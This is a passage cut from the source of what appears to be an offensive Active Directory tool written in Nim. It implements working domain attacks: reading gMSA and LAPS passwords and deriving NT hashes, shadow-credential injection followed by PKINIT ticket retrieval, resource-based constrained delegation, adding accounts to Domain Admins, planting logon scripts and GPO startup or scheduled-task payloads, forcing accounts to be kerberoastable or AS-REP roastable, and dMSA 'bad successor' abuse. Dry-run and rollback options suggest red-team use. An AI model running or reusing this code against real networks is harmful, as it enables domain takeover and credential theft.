    data.add char((value shr shift) and 0xff)

proc utf16LeToDisplay(raw: string): string =
  var i = 0
  while i + 1 < raw.len:
    let lo = ord(raw[i])
    let hi = ord(raw[i + 1])
    if lo == 0 and hi == 0:
      break
    if hi == 0 and lo >= 32 and lo <= 126:
      result.add char(lo)
    else:
      result.add "\\u" & toHex((hi shl 8) or lo, 4)
    i += 2

proc ldapFilterEscapeValue(value: string): string =
  for c in value:
    case c
    of '*': result.add "\\2a"
    of '(': result.add "\\28"
    of ')': result.add "\\29"
    of '\\': result.add "\\5c"
    of '\0': result.add "\\00"
    else: result.add c

proc ldapEscapeDcValue(value: string): string =
  for c in value:
    case c
    of ',', '+', '"', '\\', '<', '>', ';', '=': result.add "\\" & $c
    else: result.add c

proc parseGmsaManagedPasswordBlob(blob: string): JsonNode =
  result = %*{"valid": false, "raw_hex": blob.binaryHex()}
  if blob.len < 16:
    result["message"] = %"blob too short"
    return
  let version = readU16LeLocal(blob, 0)
  let length = readU32LeLocal(blob, 4)
  let currentOff = int(readU16LeLocal(blob, 8))
  let previousOff = int(readU16LeLocal(blob, 10))
  let queryOff = int(readU16LeLocal(blob, 12))
  let unchangedOff = int(readU16LeLocal(blob, 14))
  result["valid"] = %true
  result["version"] = %version
  result["length"] = %length
  result["current_password_offset"] = %currentOff
  result["previous_password_offset"] = %previousOff
  result["query_interval_offset"] = %queryOff
  result["unchanged_interval_offset"] = %unchangedOff
  if currentOff <= 0 or currentOff >= blob.len:
    result["message"] = %"current password offset outside blob"
    return
  var endOff = blob.len
  for candidate in [previousOff, queryOff, unchangedOff]:
    if candidate > currentOff and candidate < endOff:
      endOff = candidate
  var currentRaw = blob[currentOff ..< endOff]
  while currentRaw.len >= 2 and currentRaw[^1] == '\0' and currentRaw[^2] == '\0':
    currentRaw.setLen(currentRaw.len - 2)
  result["current_password_utf16le_hex"] = %currentRaw.binaryHex()
  result["current_password_display"] = %utf16LeToDisplay(currentRaw)
  result["nt_hash"] = %smbclient.md4Digest(currentRaw).binaryHex()

proc dnsRecordA(value: string; ttl: int): string =
  let parts = value.split('.')
  if parts.len != 4:
    raise newException(ValueError, "A record data must be an IPv4 address")
  var ipRaw = ""
  for part in parts:
    let octet = parseInt(part)
    if octet < 0 or octet > 255:
      raise newException(ValueError, "IPv4 octet out of range: " & part)
    ipRaw.add char(octet)
  result.addU16LeLocal 4'u16
  result.addU16LeLocal 1'u16
  result.add char(5)
  result.add char(0xf0)
  result.addU16LeLocal 0'u16
  result.addU32LeLocal 1'u32
  result.addU32BeLocal uint32(ttl)
  result.addU32LeLocal 0'u32
  result.addU32LeLocal 0'u32
  result.add ipRaw

proc csharpTicksNow(): uint64 =
  uint64(getTime().toUnix() + 62135596800'i64) * 10000000'u64

proc buildKeyCredentialDnBinary(certPath, ownerDn: string): string =
  let rsa = rsaPublicFromCertDer(pemToDer(certPath))
  if rsa.modulus.len == 0 or rsa.exponent.len == 0:
    raise newException(ValueError, "RSA public key not found in certificate")
  var publicKey = "RSA1"
  publicKey.addU32LeLocal uint32(rsa.modulus.len * 8)
  publicKey.addU32LeLocal uint32(rsa.exponent.len)
  publicKey.addU32LeLocal uint32(rsa.modulus.len)
  publicKey.addU32LeLocal 0
  publicKey.addU32LeLocal 0
  publicKey.add rsa.exponent
  publicKey.add rsa.modulus

  proc field(identifier: int; value: string): string =
    result.addU16LeLocal uint16(value.len)
    result.add char(identifier)
    result.add value

  let deviceId = smbclient.randomBytes(16)
  var creation = ""
  creation.addU64LeLocal csharpTicksNow()
  let binaryProperties =
    field(0x03, publicKey) &
    field(0x04, "\x01") &
    field(0x05, "\x00") &
    field(0x06, deviceId) &
    field(0x07, "\x01\x02") &
    field(0x09, creation)
  let keyIdentifier = smbclient.sha256Digest(publicKey)
  let keyHash = smbclient.sha256Digest(binaryProperties)
  var binary = ""
  binary.addU32LeLocal 0x200'u32
  binary.add field(0x01, keyIdentifier)
  binary.add field(0x02, keyHash)
  binary.add binaryProperties
  "B:" & $(binary.len * 2) & ":" & binary.binaryHex() & ":" & ownerDn

proc addComputerProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let generatedPassword = config.computerPassword.len == 0
  let computerPass =
    if generatedPassword: randomComputerPassword()
    else: config.computerPassword
  if config.protocol == "addcomputer" or
     (config.protocol == "ldap" and config.ldapCreateKind == "computer" and not config.useSsl):
    let r = await smbclient.addComputerSamr(
      host, 445, max(config.timeoutMs, 8000),
      smbCredential(config), config.computerName, computerPass,
      authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm
    )
    return %*{
      "protocol": "addcomputer",
      "method": "samr",
      "host": r.host,
      "port": r.port,
      "reachable": r.authenticated,
      "authenticated": r.authenticated,
      "success": r.success,
      "username": config.username,
      "auth_domain": config.domain,
      "domain_name": r.domainName,
      "domain_sid": r.domainSid,
      "rid": r.rid,
      "computer_name": r.computerName,
      "sam_account_name": r.samAccountName,
      "computer_password": computerPass,
      "password_generated": generatedPassword,
      "create_status": "0x" & r.createStatus.toHex(8),
      "password_status": "0x" & r.passwordStatus.toHex(8),
      "control_status": "0x" & r.controlStatus.toHex(8),
      "message": r.message,
      "error": r.error
    }
  let r = await ldapclient.addComputerLdap(
    host, config.port, max(config.timeoutMs, 5000),
    config.username, config.password, config.ntlmHash, config.domain,
    config.computerName, computerPass, config.computerOu,
    config.computerDnsHost
  )
  result = %*{
    "protocol": "addcomputer",
    "method": "ldap",
    "host": r.host,
    "port": r.port,
    "reachable": r.reachable,
    "authenticated": r.authenticated,
    "success": r.success,
    "username": config.username,
    "auth_domain": config.domain,
    "bind_result_code": r.bindResultCode,
    "result_code": r.resultCode,
    "diagnostic": r.diagnostic,
    "default_naming_context": r.defaultNamingContext,
    "distinguished_name": r.distinguishedName,
    "computer_name": r.computerName,
    "sam_account_name": r.samAccountName,
    "computer_password": computerPass,
    "password_generated": generatedPassword,
    "message": r.message
  }

proc ldapProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  if config.ldapOpsecNotes:
    return opsecNotesJson(host)
  let previousKrb5Ccache = getEnv("KRB5CCNAME")
  let previousKrb5Config = getEnv("KRB5_CONFIG")
  let overrideKrb5Ccache = config.kerberos and config.ccachePath.len > 0
  var tempKrb5Config = ""
  if overrideKrb5Ccache:
    let cacheValue =
      if config.ccachePath.startsWith("FILE:"): config.ccachePath
      else: "FILE:" & config.ccachePath
    putEnv("KRB5CCNAME", cacheValue)
    if config.domain.len > 0:
      let realm = config.domain.toUpperAscii()
      let dnsDomain = config.domain.toLowerAscii()
      tempKrb5Config = getTempDir() / ("nimux-ldap-krb5-" &
        $getCurrentProcessId() & "-" & $rand(1_000_000) & ".conf")
      writeFile(tempKrb5Config,
        "[libdefaults]\n" &
        " default_realm = " & realm & "\n" &
        " dns_lookup_kdc = false\n" &
        " dns_lookup_realm = false\n" &
        " rdns = false\n\n" &
        "[realms]\n" &
        " " & realm & " = {\n" &
        "  kdc = " & host & "\n" &
        " }\n\n" &
        "[domain_realm]\n" &
        " ." & dnsDomain & " = " & realm & "\n" &
        " " & dnsDomain & " = " & realm & "\n")
      putEnv("KRB5_CONFIG", tempKrb5Config)
  defer:
    if overrideKrb5Ccache:
      if previousKrb5Ccache.len > 0:
        putEnv("KRB5CCNAME", previousKrb5Ccache)
      else:
        delEnv("KRB5CCNAME")
      if previousKrb5Config.len > 0:
        putEnv("KRB5_CONFIG", previousKrb5Config)
      else:
        delEnv("KRB5_CONFIG")
      if tempKrb5Config.len > 0:
        try: removeFile(tempKrb5Config)
        except OSError: discard
  if config.ldapSetRbcd:
    let r = await ldapclient.setRbcd(host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      config.ldapFrom, config.ldapTo, kerberos=config.kerberos)
    return %*{
      "protocol": "ldap",
      "operation": "set-rbcd",
      "host": r.host,
      "port": r.port,
      "reachable": r.reachable,
      "authenticated": r.authenticated,
      "success": r.success,
      "result_code": r.resultCode,
      "diagnostic": r.diagnostic,
      "delegate_from": r.delegateFrom,
      "delegate_from_sid": r.delegateFromSid,
      "delegate_to": r.delegateTo,
      "delegate_to_dn": r.delegateToDn,
      "message": r.message
    }
  if config.ldapNestedGroups:
    let target = if config.ldapUser.len > 0: config.ldapUser else: config.ldapName
    if target.len == 0:
      return %*{"protocol": "ldap", "operation": "nested-groups",
        "host": host, "success": false, "message": "--nested-groups requires --user"}
    return ldapNestedGroupsJson(await ldapclient.nestedGroupsForAccount(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain, target,
      kerberos=config.kerberos))
  if config.ldapGetLaps:
    return ldapLapsJson(await ldapclient.lapsForComputer(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      config.computerName, kerberos=config.kerberos))
  if config.ldapLapsSchema:
    return await ldapLapsSchemaJson(host, config)
  if config.ldapDecryptMsLaps:
    return await ldapMsLapsDecryptJson(host, config)
  if config.ldapGetGmsa:
    return await ldapGmsaJson(host, config)
  if config.ldapDnsAdd or config.ldapDnsDelete or config.ldapDnsReplace:
    return await ldapDnsRecordJson(host, config)
  if config.ldapAdcsRequest:
    return await ldapAdcsRequestJson(host, config)
  if config.ldapAdcsAuth:
    return ldapAdcsAuthJson(host, config)
  if config.ldapAdcsTemplateModify:
    return await ldapAdcsTemplateModifyJson(host, config)
  if config.ldapAdcs:
    return await ldapAdcsJson(host, config)
  if config.ldapMove:
    let moveSrc =
      if config.ldapModifyDn.len > 0: config.ldapModifyDn
      elif config.ldapUser.len > 0: config.ldapUser
      elif config.ldapName.len > 0: config.ldapName
      else: ""
    if moveSrc.len == 0 or config.ldapMoveTo.len == 0:
      return %*{"protocol": "ldap", "operation": "move",
        "host": host, "success": false,
        "message": "--move requires --dn <source-dn> and --move-to <new-parent-dn>"}
    if config.dryRun:
      return %*{"protocol": "ldap", "operation": "move",
        "host": host, "success": true, "dry_run": true,
        "source": moveSrc, "new_parent": config.ldapMoveTo,
        "message": "dry-run only; no LDAP writes sent"}
    let wr = await ldapclient.moveObject(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      moveSrc, config.ldapMoveTo, kerberos=config.kerberos)
    if wr.success:
      appendRollbackRecord(config, %*{
        "operation": "move",
        "rollback_operation": "move",
        "source": moveSrc, "new_parent": config.ldapMoveTo,
        "command": ["ldap", "<dc>", "--move", "--dn", moveSrc, "--move-to", "<original-parent>"]
      })
    return ldapWriteResultJson(wr)
  if config.ldapRestoreDeleted:
    return ldapWriteResultJson(await ldapclient.restoreDeletedObject(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      config.ldapDeleteDn, config.ldapName, config.ldapRestoreTo, config.ldapNewName,
      kerberos=config.kerberos))
  if config.ldapAddMember or config.ldapRemoveMember:
    let member = if config.ldapUser.len > 0: config.ldapUser else: config.ldapName
    if config.ldapGroup.len == 0 or member.len == 0:
      return %*{"protocol": "ldap", "operation": if config.ldapRemoveMember: "remove-member" else: "add-member",
        "host": host, "success": false, "message": "--add-member/--remove-member requires --group and --user/--member"}
    if config.dryRun:
      return %*{"protocol": "ldap",
        "operation": if config.ldapRemoveMember: "remove-member" else: "add-member",
        "host": host, "success": true, "dry_run": true,
        "group": config.ldapGroup, "member": member,
        "message": "dry-run only; no LDAP writes sent"}
    let wr = await ldapclient.modifyGroupMember(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      config.ldapGroup, member, config.ldapRemoveMember, kerberos=config.kerberos)
    if wr.success:
      appendRollbackRecord(config, %*{
        "operation": if config.ldapRemoveMember: "remove-member" else: "add-member",
        "rollback_operation": if config.ldapRemoveMember: "add-member" else: "remove-member",
        "group": config.ldapGroup, "member": member,
        "command": ["ldap", "<dc>",
          (if config.ldapRemoveMember: "--add-member" else: "--remove-member"),
          "--group", config.ldapGroup, "--user", member]
      })
    return ldapWriteResultJson(wr)
  if config.ldapSetOwner:
    let target =
      if config.ldapModifyDn.len > 0: config.ldapModifyDn
      elif config.ldapUser.len > 0: config.ldapUser
      elif config.computerName.len > 0: config.computerName
      elif config.ldapName.len > 0: config.ldapName
      else: ""
    if target.len == 0 or config.ldapOwner.len == 0:
      return %*{"protocol": "ldap", "operation": "set-owner",
        "host": host, "success": false, "message": "--set-owner requires --user/--dn and --owner"}
    if config.dryRun:
      return %*{"protocol": "ldap", "operation": "set-owner",
        "host": host, "success": true, "dry_run": true,
        "target": target, "owner": config.ldapOwner,
        "message": "dry-run only; no LDAP writes sent"}
    return ldapAclModifyJson(await ldapclient.setOwnerForObject(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      target, config.ldapOwner, kerberos=config.kerberos))
  if config.ldapAcl and (config.ldapAclAdd or config.ldapAclRemove):
    let target =
      if config.ldapModifyDn.len > 0: config.ldapModifyDn
      elif config.ldapUser.len > 0: config.ldapUser
      elif config.computerName.len > 0: config.computerName
      elif config.ldapName.len > 0: config.ldapName
      else: ""
    if target.len == 0 or config.ldapAclPrincipal.len == 0 or config.ldapAclRights.len == 0:
      return %*{"protocol": "ldap", "operation": "acl-modify",
        "host": host, "success": false,
        "message": "--acl --add/--remove-ace requires --user/--dn, --principal, and --rights"}
    return await ldapAclSpecsModifyJson(host, config, target)
  if config.ldapAcl:
    let target =
      if config.ldapModifyDn.len > 0: config.ldapModifyDn
      elif config.ldapUser.len > 0: config.ldapUser
      elif config.computerName.len > 0: config.computerName
      elif config.ldapName.len > 0: config.ldapName
      else: cliBaseDn(config.domain)
    if target.len == 0:
      return %*{"protocol": "ldap", "operation": "acl",
        "host": host, "success": false, "message": "--acl requires --dn, --user, --name, or -d"}
    return ldapAclJson(await ldapclient.aclForObject(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain, target,
      kerberos=config.kerberos))
  if config.ldapMakeDadmin:
    let user = if config.ldapUser.len > 0: config.ldapUser else: config.ldapName
    if config.dryRun:
      return %*{"protocol": "ldap", "operation": "make-dadmin",
        "host": host, "success": true, "dry_run": true,
        "group": "Domain Admins", "member": user,
        "message": "dry-run only; no LDAP writes sent"}
    let wr = await ldapclient.addDomainAdminsMember(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain, user,
      kerberos=config.kerberos)
    if wr.success:
      appendRollbackRecord(config, %*{
        "operation": "make-dadmin", "rollback_operation": "remove-member",
        "group": "Domain Admins", "member": user,
        "command": ["ldap", "<dc>", "--remove-member", "--group", "Domain Admins", "--user", user]
      })
    return ldapWriteResultJson(wr)
  if config.ldapSetScriptPath:
    let account = if config.ldapUser.len > 0: config.ldapUser else: config.ldapName
    if account.len == 0:
      return %*{"protocol": "ldap", "operation": "set-scriptpath", "host": host,
        "success": false, "message": "--set-scriptpath requires --user <sAMAccountName>"}
    if config.dryRun:
      return %*{"protocol": "ldap", "operation": "set-scriptpath", "host": host,
        "success": true, "dry_run": true, "account": account,
        "script_path": config.ldapScriptPath,
        "message": "dry-run only; no LDAP writes sent"}
    let wr = await ldapclient.replaceAccountAttributeValue(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      account, "scriptPath", config.ldapScriptPath, kerberos=config.kerberos)
    var node = ldapWriteResultJson(wr)
    node["operation"] = %"set-scriptpath"
    node["account"] = %account
    node["script_path"] = %config.ldapScriptPath
    if wr.success:
      appendRollbackRecord(config, %*{
        "operation": "set-scriptpath", "rollback_operation": "clear-scriptpath",
        "account": account, "script_path": config.ldapScriptPath,
        "command": ["ldap", "<dc>", "--set-scriptpath", "--user", account, "--script-path", ""]
      })
    return node
  if config.ldapMakeKerberoast:
    if config.dryRun:
      return %*{"protocol": "ldap", "operation": "make-kerberoast",
        "host": host, "success": true, "dry_run": true,
        "account": config.ldapUser, "spn": config.ldapSpn,
        "message": "dry-run only; no LDAP writes sent"}
    let wr = await ldapclient.setAccountSpn(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      config.ldapUser, config.ldapSpn, kerberos=config.kerberos)
    if wr.success:
      appendRollbackRecord(config, %*{
        "operation": "make-kerberoast", "rollback_operation": "delete-spn-value",
        "account": config.ldapUser, "spn": config.ldapSpn,
        "command": ["ldap", "<dc>", "--modify", "--user", config.ldapUser,
          "--delete", "servicePrincipalName=" & config.ldapSpn]
      })
    return ldapWriteResultJson(wr)
  if config.ldapCertMap:
    let account = if config.ldapUser.len > 0: config.ldapUser else: config.ldapName
    if account.len == 0 or config.ldapCertMapping.len == 0:
      return %*{"protocol": "ldap", "operation": "cert-map", "host": host,
        "success": false, "message": "--cert-map requires --user/--name and --mapping"}
    if config.dryRun:
      return %*{"protocol": "ldap", "operation": "cert-map", "host": host,
        "success": true, "dry_run": true, "account": account,
        "attribute": "altSecurityIdentities", "mapping": config.ldapCertMapping,
        "mode": if config.ldapCertMapRemove: "remove" else: "add",
        "message": "dry-run only; no LDAP writes sent"}
    let wr = await ldapclient.modifyAccountAttributeValue(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      account, "altSecurityIdentities", config.ldapCertMapping,
      deleteValue=config.ldapCertMapRemove, kerberos=config.kerberos)
    var node = ldapWriteResultJson(wr)
    node["operation"] = %"cert-map"
    node["account"] = %account
    node["attribute"] = %"altSecurityIdentities"
    node["mapping"] = %config.ldapCertMapping
    node["mode"] = %(if config.ldapCertMapRemove: "remove" else: "add")
    if wr.success:
      var rollbackCmd = newJArray()
      for part in ["ldap", "<dc>", "--cert-map"]:
        rollbackCmd.add %part
      if not config.ldapCertMapRemove:
        rollbackCmd.add %"--remove-map"
      for part in ["--user", account, "--mapping", config.ldapCertMapping]:
        rollbackCmd.add %part
      appendRollbackRecord(config, %*{
        "operation": "cert-map",
        "rollback_operation": if config.ldapCertMapRemove: "cert-map-add" else: "cert-map-remove",
        "account": account, "mapping": config.ldapCertMapping,
        "command": rollbackCmd
      })
    return node
  if config.ldapGpo and config.ldapGpoDelegate:
    return await gpoDelegateJson(host, config)
  if config.ldapGpo and config.ldapGpoCreate:
    return await gpoCreateJson(host, config)
  if config.ldapGpo and config.ldapGpoStartup:
    return await gpoStartupScriptJson(host, config)
  if config.ldapGpo and config.ldapGpoSchedTask:
    return await gpoScheduledTaskJson(host, config)
  if config.ldapGpo and config.ldapGpoLs:
    return await gpoSysvolManageJson(host, config, "gpo-ls", config.remotePath)
  if config.ldapGpo and config.ldapGpoGet.len > 0:
    return await gpoSysvolManageJson(host, config, "gpo-get", config.ldapGpoGet)
  if config.ldapGpo and config.ldapGpoDelete.len > 0:
    return await gpoSysvolManageJson(host, config, "gpo-delete", config.ldapGpoDelete)
  if config.ldapGpo and config.ldapGpoPut.len > 0:
    return await gpoSysvolPutJson(host, config)
  if config.ldapGpo and (config.ldapGpoLink.len > 0 or config.ldapGpoUnlink.len > 0):
    let gpo = if config.ldapGpoLink.len > 0: config.ldapGpoLink else: config.ldapGpoUnlink
    if config.ldapGpoTarget.len == 0:
      return %*{"protocol": "ldap", "operation": "gpo-link",
        "host": host, "success": false, "message": "--gpo --link/--unlink requires --target <dn>"}
    if config.dryRun:
      return %*{"protocol": "ldap", "operation": "gpo-link",
        "host": host, "success": true, "dry_run": true,
        "gpo": gpo, "target": config.ldapGpoTarget,
        "mode": if config.ldapGpoUnlink.len > 0: "unlink" else: "link",
        "message": "dry-run only; no LDAP writes sent"}
    let wr = await ldapclient.setGpoLink(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      gpo, config.ldapGpoTarget, config.ldapGpoUnlink.len > 0,
      kerberos=config.kerberos)
    if wr.success:
      appendRollbackRecord(config, %*{
        "operation": if config.ldapGpoUnlink.len > 0: "gpo-unlink" else: "gpo-link",
        "rollback_operation": if config.ldapGpoUnlink.len > 0: "gpo-link" else: "gpo-unlink",
        "gpo": gpo, "target": config.ldapGpoTarget,
        "command": ["ldap", "<dc>", "--gpo",
          (if config.ldapGpoUnlink.len > 0: "--link" else: "--unlink"),
          gpo, "--target", config.ldapGpoTarget]
      })
    return ldapWriteResultJson(wr)
  if config.ldapGpo and config.ldapGpoSet:
    let gpo = if config.ldapName.len > 0: config.ldapName else: config.ldapModifyDn
    if gpo.len == 0 or (config.ldapAddAttrs.len == 0 and config.ldapReplaceAttrs.len == 0 and config.ldapDeleteAttrs.len == 0):
      return %*{"protocol": "ldap", "operation": "gpo-set",
        "host": host, "success": false, "message": "--gpo --set requires --name/--dn and --add/--replace/--delete attr=value"}
    var mods: seq[ldapclient.LdapModification]
    mods.add modsFromAssignments(config.ldapAddAttrs, ldapclient.lmoAdd)
    mods.add modsFromAssignments(config.ldapReplaceAttrs, ldapclient.lmoReplace)
    mods.add modsFromAssignments(config.ldapDeleteAttrs, ldapclient.lmoDelete)
    if config.dryRun:
      var planned = newJArray()
      for m in mods:
        var vals = newJArray()
        for v in m.values: vals.add %v
        planned.add %*{"op": $m.op, "attr": m.attr, "values": vals}
      return %*{"protocol": "ldap", "operation": "gpo-set",
        "host": host, "success": true, "dry_run": true,
        "gpo": gpo, "mods": planned,
        "message": "dry-run only; no LDAP writes sent"}
    return ldapWriteResultJson(await ldapclient.modifyGpoObject(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain, gpo, mods,
      kerberos=config.kerberos))
  if config.ldapEnableFlag:
    return ldapWriteResultJson(await ldapclient.setUserEnabled(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      (if config.ldapEnableUser.len > 0: config.ldapEnableUser else: config.ldapUser), true,
      kerberos=config.kerberos))
  if config.ldapDisableFlag:
    return ldapWriteResultJson(await ldapclient.setUserEnabled(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      (if config.ldapDisableUser.len > 0: config.ldapDisableUser else: config.ldapUser), false,
      kerberos=config.kerberos))
  if config.ldapShadowCreds:
    let target = if config.ldapUser.len > 0: config.ldapUser else: config.ldapName
    if target.len == 0:
      return %*{"protocol": "ldap", "host": host, "success": false,
        "message": "--shadow-creds requires --user"}
    var certFile = config.ldapCertFile
    var generatedKey = ""
    var shadowCaFile = ""
    if certFile.len == 0 and config.ldapShadowOut.len > 0:
      certFile = config.ldapShadowOut & ".crt"
      generatedKey = config.ldapShadowOut & ".key"
      shadowCaFile = config.ldapShadowOut & ".shadow-ca.pem"
      let certUpn =
        if config.domain.len > 0: target & "@" & config.domain.toUpperAscii()
        else: target
      let (certPem, keyPem, caCertPem) =
        try: generateSelfSignedCert(target, certUpn)
        except CatchableError as err:
          return %*{"protocol": "ldap", "operation": "shadow-creds",
            "host": host, "success": false, "message": "cert generation failed: " & err.msg}
      writeFile(certFile, certPem)
      writeFile(generatedKey, keyPem)
      writeFile(shadowCaFile, caCertPem)
    if certFile.len == 0:
      return %*{"protocol": "ldap", "host": host, "success": false,
        "message": "--shadow-creds requires --cert <cert.pem> or --shadow-out <prefix>"}
    let keyCredential = buildKeyCredentialDnBinary(certFile, "{DN}")
    var node = ldapWriteResultJson(await ldapclient.addAccountAttribute(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      target, "msDS-KeyCredentialLink", keyCredential, kerberos=config.kerberos,
      replace=true))
    node["operation"] = %"shadow-creds"
    node["cert"] = %certFile
    if generatedKey.len > 0:
      node["key"] = %generatedKey
    if generatedKey.len > 0 and node{"success"}.getBool() and node{"items"}.getElems().len > 0 and
        node["items"][0]{"success"}.getBool():
      let upn = target & "@" & config.domain.toUpperAscii()
      let ccacheDest =
        if config.ldapShadowOut.len > 0: config.ldapShadowOut & ".ccache"
        else: getCurrentDir() / (target & ".ccache")
      let r = pkinitmod.pkinitGetTgtNative(host, config.domain, upn,
        certFile, generatedKey, ccacheDest, max(config.timeoutMs, 5000))
      node["pkinit_success"] = %r.success
      node["ccache"] = %ccacheDest
      node["pkinit_message"] = %r.message
    return node
  var actions: seq[ldapclient.LdapWriteAction]
  var writeBaseDn = ""
  var writeDnsDomain = ""
  let needsResolvedBaseDn =
    (config.ldapCreateKind.len > 0 and config.ldapCreateKind notin ["computer"]) or
    config.ldapSetPassword or
    config.ldapMakeAsreproast or
    config.ldapDeleteKind.len > 0
  if needsResolvedBaseDn:
    writeBaseDn = await resolveWriteBaseDn(host, config)
    writeDnsDomain = baseDnToDnsName(writeBaseDn)
  if config.ldapLdif.len > 0:
    actions.add parseLdifActions(config.ldapLdif)
  var dmsaDn = ""
  var dmsaTargetActions: seq[ldapclient.LdapWriteAction]
  if config.ldapCreateKind == "dmsa":
    let createAction = buildCreateAction(config, writeBaseDn, writeDnsDomain)
    dmsaDn = createAction.dn
    var createAttrs = createAction.attrs
    if config.ldapBadSuccessorTarget.len > 0:
      createAttrs.add (name: "msDS-ManagedAccountPrecededByLink", values: @[config.ldapBadSuccessorTarget])
    actions.add ldapclient.LdapWriteAction(kind: ldapclient.lwAdd, dn: dmsaDn, attrs: createAttrs)
    if config.ldapBadSuccessorTarget.len > 0:
      dmsaTargetActions.add ldapclient.LdapWriteAction(kind: ldapclient.lwModify,
        dn: config.ldapBadSuccessorTarget,
        mods: @[
          ldapclient.LdapModification(op: ldapclient.lmoReplace,
            attr: "msDS-SupersededManagedAccountLink", values: @[dmsaDn]),
          ldapclient.LdapModification(op: ldapclient.lmoReplace,
            attr: "msDS-SupersededServiceAccountState", values: @["2"])
        ])
  elif config.ldapCreateKind.len > 0 and config.ldapCreateKind != "computer":
    actions.add buildCreateAction(config, writeBaseDn, writeDnsDomain)
    if config.ldapCreateKind == "user" and config.ldapNewPass.len > 0 and
        not (config.useSsl or config.port in [636, 3269]):
      let userDn =
        if config.ldapAddDn.len > 0: config.ldapAddDn
        else: "CN=" & config.ldapName & ",CN=Users," & writeBaseDn
      actions.add ldapclient.LdapWriteAction(kind: ldapclient.lwModify, dn: userDn,
        mods: @[ldapclient.LdapModification(op: ldapclient.lmoReplace,
          attr: "unicodePwd", values: @[ldapclient.encodeAdPassword(config.ldapNewPass)])])
      actions.add ldapclient.LdapWriteAction(kind: ldapclient.lwModify, dn: userDn,
        mods: @[ldapclient.LdapModification(op: ldapclient.lmoReplace,
          attr: "userAccountControl", values: @["512"])])
  if config.ldapModifyDn.len > 0 and
      (config.ldapAddAttrs.len > 0 or config.ldapReplaceAttrs.len > 0 or config.ldapDeleteAttrs.len > 0):
    var mods: seq[ldapclient.LdapModification]
    mods.add modsFromAssignments(config.ldapAddAttrs, ldapclient.lmoAdd)
    mods.add modsFromAssignments(config.ldapReplaceAttrs, ldapclient.lmoReplace)
    mods.add modsFromAssignments(config.ldapDeleteAttrs, ldapclient.lmoDelete)
    actions.add ldapclient.LdapWriteAction(kind: ldapclient.lwModify,
      dn: config.ldapModifyDn, mods: mods)
  if config.ldapSetPassword:
    if config.ldapModifyDn.len == 0 and config.ldapUser.len > 0:
      return ldapWriteResultJson(await ldapclient.replaceAccountAttributeValue(
        host, config.port, max(config.timeoutMs, 5000),
        config.username, config.password, config.ntlmHash, config.domain,
        config.ldapUser, "unicodePwd", ldapclient.encodeAdPassword(config.ldapNewPass),
        kerberos=config.kerberos))
    let dn =
      if config.ldapModifyDn.len > 0: config.ldapModifyDn
      else: raise newException(ValueError, "--set-password requires --user or --dn")
    actions.add ldapclient.LdapWriteAction(kind: ldapclient.lwModify, dn: dn,
      mods: @[ldapclient.LdapModification(op: ldapclient.lmoReplace,
        attr: "unicodePwd", values: @[ldapclient.encodeAdPassword(config.ldapNewPass)])])
  if config.ldapMakeAsreproast:
    let user = if config.ldapUser.len > 0: config.ldapUser else: config.ldapName
    actions.add ldapclient.LdapWriteAction(kind: ldapclient.lwModify,
      dn: "CN=" & user & ",CN=Users," & writeBaseDn,
      mods: @[ldapclient.LdapModification(op: ldapclient.lmoReplace,
        attr: "userAccountControl", values: @["4194816"])])
  if config.ldapDeleteObject and config.ldapDeleteDn.len > 0:
    actions.add ldapclient.LdapWriteAction(kind: ldapclient.lwDelete, dn: config.ldapDeleteDn)
  elif config.ldapDeleteKind.len > 0:
    let name = config.ldapName
    let dn =
      case config.ldapDeleteKind
      of "computer":
        let parts = computerPartsCli(name)
        "CN=" & parts.cn & ",CN=Computers," & writeBaseDn
      of "group": "CN=" & name & ",CN=Users," & writeBaseDn
      else: "CN=" & name & ",CN=Users," & writeBaseDn
    actions.add ldapclient.LdapWriteAction(kind: ldapclient.lwDelete, dn: dn)
  if actions.len > 0:
    if config.dryRun:
      var planned = newJArray()
      for action in actions:
        var mods = newJArray()
        for m in action.mods:
          var vals = newJArray()
          for v in m.values: vals.add %v
          mods.add %*{"op": $m.op, "attr": m.attr, "values": vals}
        var attrs = newJArray()
        for a in action.attrs:
          var vals = newJArray()
          for v in a.values: vals.add %v
          attrs.add %*{"attr": a.name, "values": vals}
        planned.add %*{"kind": $action.kind, "dn": action.dn,
          "attrs": attrs, "mods": mods}
      return %*{"protocol": "ldap", "operation": "dry-run",
        "host": host, "success": true, "planned": planned,
        "message": "dry-run only; no LDAP writes sent"}
    let writePort = config.port
    let writeResult = await ldapclient.applyLdapActions(
      host, writePort, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain, actions,
      kerberos=config.kerberos)
    var node = ldapWriteResultJson(writeResult)
    if config.ldapCreateKind == "dmsa":
      node["operation"] = %"bad-successor"
    if writeResult.success and config.ldapCreateKind == "dmsa":
      let parts = computerPartsCli(config.ldapName)
      let realm = (if config.domain.len > 0: config.domain else: writeDnsDomain).toUpperAscii()
